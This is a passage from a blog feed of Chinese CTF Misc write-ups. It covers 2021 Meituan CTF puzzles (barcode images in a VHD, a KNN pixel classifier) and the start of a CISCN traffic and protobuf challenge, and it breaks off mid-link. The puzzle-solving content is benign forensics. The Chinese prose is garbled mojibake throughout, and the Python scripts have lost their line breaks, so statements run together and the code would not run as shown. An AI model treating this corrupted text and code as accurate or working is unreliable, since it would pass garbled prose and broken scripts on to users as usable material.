punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DYN_CONFIG_TYPE</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PARENT_ID</span><span class="token punctuation">&gt;</span></span>flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PARENT_ID</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TARGET</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ATHENA</span><span class="token punctuation">&gt;</span></span></code></pre><p>å¦å¤–è¿˜æå–å‡ºæ¥ä¸ª <code>Top_secret.zip</code>ï¼Œè§£å‹å‡ºæ¥ä¸€ä¸ª <code>client_secret.dat</code>ï¼Œé‡Œé¢æ˜¯</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span><span class="token punctuation">&gt;</span></span>6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sign</span><span class="token punctuation">&gt;</span></span>2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806</code></pre><p>åº”è¯¥æ˜¯æ•°æ®å’Œç­¾åï¼Œæ‹¿å¯†é’¥å»è§£å¯†åº”è¯¥å°±å¥½äº†8</p><p>ï¼ˆåæ¥å»çœ‹å…¶ä»–æ¯”èµ›é¢˜ç›®äº†â€¦â€¦</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™ä¸ªæ¯”èµ›æ¯”è¾ƒåŸºç¡€ï¼Œé€‚åˆæ‹¿æ¥æ‘¸ğŸŸã€‚</p><p>éšä¾¿ç©ç©å°±å¥½äº†ï¼Œç›¸å¯¹è€Œè¨€è¿˜æ˜¯å¤§ä¸€ç‚¹çš„æ¯”èµ›é¢˜ç›®è´¨é‡æ›´é«˜ä¸€äº›ã€‚</p><p>ï¼ˆæºœäº†æºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 ç¾å›¢CTF Misc WriteUp</title>
      <link href="2021/05/26/CTF_2021MeiTuan/"/>
      <url>2021/05/26/CTF_2021MeiTuan/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/26/CTF_2021MeiTuan/image-20210525204859424.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>ç¾å›¢ç½‘ç»œå®‰å…¨é«˜æ ¡æŒ‘æˆ˜èµ› MT-CTF</strong></p><p>æ¯”èµ›æ—¶é—´: 2021-05-23 09:00 ~ 2021-05-23 21:00</p><p>æ¯”èµ›å®˜ç½‘: <a href="https://www.ichunqiu.com/meituan">https://www.ichunqiu.com/meituan</a></p></blockquote><p>å‘¨æœ«æœ‰ä¸ªç¾å›¢ CTFï¼Œç„¶è€Œé‚£å¤©ç™½å¤©ä¸€ç›´åœ¨èµ¶ DDLï¼Œä¹ˆå¾—åŠæ³•ã€‚</p><p>è²Œä¼¼ä¹Ÿæ²¡å•¥å¸ˆå‚…æ‰“è¿™ä¸ªæ¯”èµ›ï¼Œæ„Ÿè§‰æƒ¨æƒ¨æ·¡æ·¡çš„ã€‚</p><p>ï¼ˆä¼°è®¡æ˜¯å†³èµ›å’Œå…¶ä»–æ¯”èµ›å†²çªçš„åŸå› å§ï¼Œæ‘Šæ‰‹</p><p>åˆ°äº†æ™šä¸Šé—®äº†ä¸‹åˆ«çš„å¸ˆå‚…ï¼Œè¯´ misc é¢˜æ²¡ä»€ä¹ˆäººåšå‡ºæ¥ï¼Œäºæ˜¯åƒå®Œé¥­å’±å°±æ¥çœ‹äº†çœ‹ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Different-Puzzle"><a href="#Different-Puzzle" class="headerlink" title="Different_Puzzle"></a>Different_Puzzle</h3><blockquote><p>è¿™äº›å›¾ç‰‡å¥½åƒä¸èƒ½ç”¨è›®åŠ›ã€‚</p><p><a href="https://pan.baidu.com/s/124nTjoz0jZRao-S0H0eUMw">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/SOCF9FR4">å¤‡ç”¨ä¸‹è½½</a></p></blockquote><p>ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª <code>null.vhd</code></p><p>è¿™æ˜¯ä¸€ä¸ª Windows çš„è™šæ‹Ÿç£ç›˜æ–‡ä»¶ï¼Œé¦–å…ˆè¿›è®¡ç®—æœºç®¡ç†-ç£ç›˜ç®¡ç†ï¼ŒæŠŠç›˜æŒ‚ä¸Šå»ã€‚</p><p><img src="/2021/05/26/CTF_2021MeiTuan/image-20210523222236398.png"></p><p>å¾—åˆ°ä¸€å †é»‘ç™½ç›¸é—´çš„å›¾ç‰‡ã€‚</p><p><img src="/2021/05/26/CTF_2021MeiTuan/image-20210523225719744.png"></p><p>ï¼ˆ<code>flag.txt</code> æ˜¯ä¹‹åå¾—åˆ°çš„ï¼‰</p><p>å›¾ç‰‡é«˜åº¦éƒ½ä¸º100ï¼Œå®½åº¦æœ‰æ‰€åŒºåˆ«ã€‚ç›²çŒœæ˜¯ä¸€ç»´ç äº†ã€‚</p><p>å†™ä¸ªjioæœ¬åˆæˆä¸€ä¸‹ã€‚</p><p>å…¶å®å†™è„šæœ¬çš„æ—¶å€™è¿™é‡Œç›´æ¥æ˜¯ foremost å¯¼å‡ºæ¥çš„ï¼ŒæŒ‰ç…§ <code>null.vhd</code> é‡Œå­˜æ”¾çš„å…ˆåé¡ºåºã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> PIL<span class="token punctuation">.</span>Image <span class="token keyword">as</span> Image<span class="token keyword">import</span> osIMAGES_PATH <span class="token operator">=</span> <span class="token string">r'.\Misc_Different_Puzzle\null.vhd_outfile\png\\'</span>IMAGE_SAVE_PATH <span class="token operator">=</span> <span class="token string">r'.\Misc_Different_Puzzle\\'</span>  image_names <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>IMAGES_PATH<span class="token punctuation">)</span> <span class="token keyword">if</span> x<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.png'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>to_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> img <span class="token keyword">in</span> image_names<span class="token punctuation">:</span>    from_image <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>IMAGES_PATH <span class="token operator">+</span> img<span class="token punctuation">)</span>    im_size <span class="token operator">=</span> from_image<span class="token punctuation">.</span>size    to_image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>from_image<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x <span class="token operator">+=</span> im_size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>to_image<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>to_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'decode.png'</span><span class="token punctuation">)</span><span class="token comment"># EuO9&amp;cDH</span></code></pre><p><img src="/2021/05/26/CTF_2021MeiTuan/decode.png" alt="decode"></p><p>æ‰«ç å¾—åˆ° <code>EuO9&amp;cDH</code></p><p>ç„¶ååœ¨ <code>flag.exe</code> è¾“å…¥å°±èƒ½å¾—åˆ° <code>flag.txt</code> æ‰“å¼€å°±æ˜¯ flagã€‚</p><p><img src="/2021/05/26/CTF_2021MeiTuan/image-20210523230329268.png"></p><p><code>flag{af26d693-2de2-4b16-be49-d95e83a43f76}</code></p><h3 id="pixel"><a href="#pixel" class="headerlink" title="pixel"></a>pixel</h3><blockquote><p>Colorful pixel image.</p><p><a href="https://pan.baidu.com/s/1GqXh9sP-RVKwF2TNZ7eB6w">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰<a href="https://share.weiyun.com/5CcDg1bf">å¤‡ç”¨ä¸‹è½½</a></p><p>Hint: do you know knn?</p></blockquote><blockquote><p>è¿™é¢˜åšçš„æ—¶å€™å’±å°±çŒœæ˜¯ä¸æ˜¯è¦ç”¨æœºå™¨å­¦ä¹ æ¥åšä¸ªäºŒåˆ†ç±»ï¼Œæœç„¶åœ¨æ¯”èµ›ç»“æŸå‰åå‡ åˆ†é’Ÿæ”¾äº†ä¸ª hint è¯´æ˜¯ KNNï¼Œå®é”¤äº†ã€‚</p><p>ï¼ˆåªä¸è¿‡æ²¡æ—¶é—´åšäº†å€’æ˜¯äº†</p></blockquote><p>å¼€å±€ä¸€å¼ å›¾åŠ ä¸€ä¸ª txtã€‚</p><p><img src="/2021/05/26/CTF_2021MeiTuan/pixel.png" alt="pixel"></p><p><code>useful.txt</code> </p><p><img src="/2021/05/26/CTF_2021MeiTuan/image-20210524031417131.png" alt="useful.txt"></p><p>ä¸€å…± 88209 è¡Œæ•°æ®ï¼Œæ­£å¥½æ˜¯ 297x297ã€‚</p><p>é‚£è¯´ä¸å®šæ‹¬å·é‡Œå°±æ˜¯ (R, G, B, A)ï¼ŒæŠŠå¯¹åº”çš„é¢œè‰²æ˜ å°„ä¸º 0 å’Œ 1ï¼Œé‚£å°±æ˜¯äºŒç»´ç äº†å§ã€‚</p><p>å†™ä¸ª jio æœ¬å¤åŸä¸€ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'useful.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment"># print(l)</span>re_info <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(\d) &lt;--- (\(.*\))'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">:</span>    info <span class="token operator">=</span> re_info<span class="token punctuation">.</span>search<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    data<span class="token punctuation">[</span>info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># print(data)</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'pixel.png'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>im<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token comment"># (297, 297)</span>width <span class="token operator">=</span> im<span class="token punctuation">.</span>widthheight <span class="token operator">=</span> im<span class="token punctuation">.</span>heightim2 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">,</span> im<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> im<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            im2<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># else:</span>            <span class="token comment"># im2.putpixel((i, j), (255, 255, 255))</span><span class="token comment"># im2.show()</span>im2<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'decrypt2.png'</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚</p><p><img src="/2021/05/26/CTF_2021MeiTuan/decrypt.png" alt="decrypt"></p><p>æ‰«æ QR å¾—åˆ° <code>8c8040579121e55ca4c58f9</code>ï¼Œæ‹¿å»è§£å‹ã€‚</p><p>å¾—åˆ°è¿˜æ˜¯ä¸€å¼ åƒç´ ç‚¹æ··ä¹±çš„å›¾å’Œä¸€ä¸ªå’Œä¹‹å‰ç±»ä¼¼çš„æ–‡æœ¬ã€‚</p><p>ä½†æ˜¯è¿™æ¬¡çš„ RGBA å¹¶ä¸èƒ½å¯¹åº”ä¸Šã€‚</p><p>äºæ˜¯è€ƒè™‘æ˜¯ä¸æ˜¯è¦åšä¸ªäºŒåˆ†ç±»ï¼Œå°±æŠŠå››ç»´çš„ RGBA åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«å¯¹åº”ç€é»‘å’Œç™½ä¸¤ç§ç»“æœã€‚</p><p>é¦–å…ˆç”¨æ‰€ç»™çš„æ•°æ®ä½œä¸ºè®­ç»ƒé›†å¾—åˆ°ä¸€ä¸ªæ¨¡å‹ï¼Œç„¶ååœ¨ <code>flag.png</code> ä¸Šä½œä¸ºæµ‹è¯•é›†è¿›è¡Œé¢„æµ‹ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªé»‘ç™½å›¾åƒï¼Œå¤§æ¦‚ç‡ä¹Ÿæ˜¯ QRç  æˆ–è€… æ¯”è¾ƒå®¹æ˜“è¾¨è¯†çš„å›¾å½¢ã€‚</p><p>å‚è€ƒ <a href="https://desertwatermelon.blog.csdn.net/article/details/81455344">KNNåˆ†ç±»ç®—æ³•åŸç†åŠå®ç°åŠsklearnä¸­çš„ä½¿ç”¨æ–¹æ³•</a>ï¼Œ<a href="https://blog.csdn.net/pengjunlee/article/details/82713047">æœºå™¨å­¦ä¹ ä¹‹KNNæœ€é‚»è¿‘åˆ†ç±»ç®—æ³•</a></p><p>å’±å°±æ•´ä¸ª KNN å‡ºæ¥å§ã€‚</p><p>è¿™é‡Œç›´æ¥ç”¨ sklearn é‡Œè‡ªå¸¦çš„ KNN æ¥å®ç°äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># å¯¼å…¥ç”»å›¾å·¥å…·</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># å¯¼å…¥æ•°ç»„å·¥å…·</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># å¯¼å…¥æ•°æ®é›†ç”Ÿæˆå™¨</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> make_blobs<span class="token comment"># å¯¼å…¥KNN åˆ†ç±»å™¨</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>neighbors <span class="token keyword">import</span> KNeighborsClassifier<span class="token comment"># å¯¼å…¥æ•°æ®é›†æ‹†åˆ†å·¥å…·</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token keyword">import</span> re<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag/hint.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>re_info <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(\d) &lt;--- (\(.*\))'</span><span class="token punctuation">)</span>X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">:</span>    info <span class="token operator">=</span> re_info<span class="token punctuation">.</span>search<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    tmp1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    tmp2 <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp2<span class="token punctuation">)</span>    Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span>    clf <span class="token operator">=</span> KNeighborsClassifier<span class="token punctuation">(</span><span class="token punctuation">)</span>clf<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag/flag.png'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>im<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token comment"># (297, 297)</span>width <span class="token operator">=</span> im<span class="token punctuation">.</span>widthheight <span class="token operator">=</span> im<span class="token punctuation">.</span>heightim2 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">,</span> im<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> im<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> clf<span class="token punctuation">.</span>predict<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>        <span class="token keyword">if</span> res <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            im2<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im2<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>im2<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'decrypt2.png'</span><span class="token punctuation">)</span></code></pre><p><img src="/2021/05/26/CTF_2021MeiTuan/decrypt2.png" alt="decrypt2"></p><p>è™½ç„¶æœ‰ç‚¹æ¨¡ç³Šï¼Œä½†ç¼©å°ä¸€ç‚¹è¿˜æ˜¯èƒ½æ‰«å‡ºæ¥çš„ã€‚</p><p><img src="/2021/05/26/CTF_2021MeiTuan/image-20210524030437213.png"></p><p><code>flag{7he_p!xe1_wi7h_0ff5et}</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>çœŸå°±é‡äº‹ä¸å†³ï¼Œæœºå™¨å­¦ä¹ å‘—ï¼</p><p>å…¶ä»–é¢˜å€’æ²¡æ€ä¹ˆçœ‹ï¼Œå’±åªæ˜¯ä½›ç³»åšåšç½¢äº†ã€‚</p><p>å”‰ï¼Œå–µå–µèœèœï¼Œçˆ¬èµ°äº†ã€‚</p><p>ï¼ˆæºœäº†æºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 CISCNåˆèµ› Misc WriteUp</title>
      <link href="2021/05/25/CTF_2021CISCN_preliminary/"/>
      <url>2021/05/25/CTF_2021CISCN_preliminary/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210525205134237.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>2021 å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ› (CISCN)</strong></p><p>æ¯”èµ›æ—¶é—´: 2021-05-15 09:00 ~ 2021-05-16 09:00</p><p>æ¯”èµ›å®˜ç½‘: <a href="http://www.ciscn.cn/">http://www.ciscn.cn/</a></p></blockquote><p>ä¸€å¹´ä¸€åº¦çš„å›½èµ›åˆæ¥äº†ï¼Œè¿ç»­æ‰“ 24h å¤ªéš¾å—å•¦ï¼</p><p>ä»Šå¹´å›½èµ›æ­£å¥½ç¢°ä¸Šå’± ddlï¼Œæ‰“å®Œå›½èµ›åˆå»èµ¶ ddl å»äº†ï¼Œå¤ªéš¾é¡¶äº†ã€‚</p><p>äºæ˜¯ä¸€ç›´ä¹Ÿæ²¡æ—¶é—´æ¥æ•´ç† WriteUpï¼Œä»Šå¤©æ‘¸é±¼ï¼Œå°±æ¥å†™å‡ é“ misc é¢˜ç›®å¥½äº†ã€‚</p><h2 id="ç¬¬ä¸€é˜¶æ®µ"><a href="#ç¬¬ä¸€é˜¶æ®µ" class="headerlink" title="ç¬¬ä¸€é˜¶æ®µ"></a>ç¬¬ä¸€é˜¶æ®µ</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>æŠ“åŒ…æ–‡ä»¶å¯¼å‡º http å¯¹è±¡</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210515152049089.png"></p><p>192.168.2.1 æ˜¯è·¯ç”±å™¨ï¼Œ192.168.2.193 æ˜¯å° NASï¼Œ5000ç«¯å£å¼€äº†ä¸ª python web æœåŠ¡ã€‚çœ‹ä¸Šå»æœ€åçš„æ˜¯ä¸ª rpc</p><p><code>flag_wrapper</code> å¯¼å‡ºå†…å®¹ï¼Œè§£å‹ä¹‹åå¾—åˆ°</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210515144137795.png"></p><p><code>test</code> å’Œ <code>secret</code> ç”¨ brotli è§£å‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> brotli<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>x <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'secret'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s2 <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>y <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>s2<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'secret1'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>y<span class="token punctuation">)</span></code></pre><p>å‘ç° <code>test</code> æ˜¯ <a href="https://developers.google.com/protocol-buffers">Protocol Buffzers</a></p><p>å‚è€ƒ <a href="https://github.com/MonsterMeng92/protobuf/blob/master/docs/%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97(proto3).md">https://github.com/MonsterMeng92/protobuf/blob/master/docs/%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97(proto3).md</a></p><pre class="language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">PBResponse</span> <span class="token punctuation">{</span>  <span class="token builtin">int32</span> code <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token builtin">int64</span> flag_part_convert_to_hex_plz <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">message</span> <span class="token class-name">data</span> <span class="token punctuation">{</span>    <span class="token builtin">string</span> junk_data <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token builtin">string</span> flag_part <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">repeated</span> <span class="token positional-class-name class-name">data</span> dataList <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token builtin">int32</span> flag_part_plz_convert_to_hex <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token builtin">string</span> flag_last_part <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">message</span> <span class="token class-name">PBRequest</span> <span class="token punctuation">{</span>  <span class="token builtin">string</span> cate_id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token builtin">int32</span> page <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token builtin">int32</span> pageSize <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>é‡Œé¢å®šä¹‰äº†ä¼ è¾“ä¸­çš„æ ¼å¼ã€‚</p><p>è€Œ<code>secret</code> æ˜¯åºåˆ—åŒ–åçš„å¯†æ–‡ã€‚</p><p>å‚è€ƒ <a 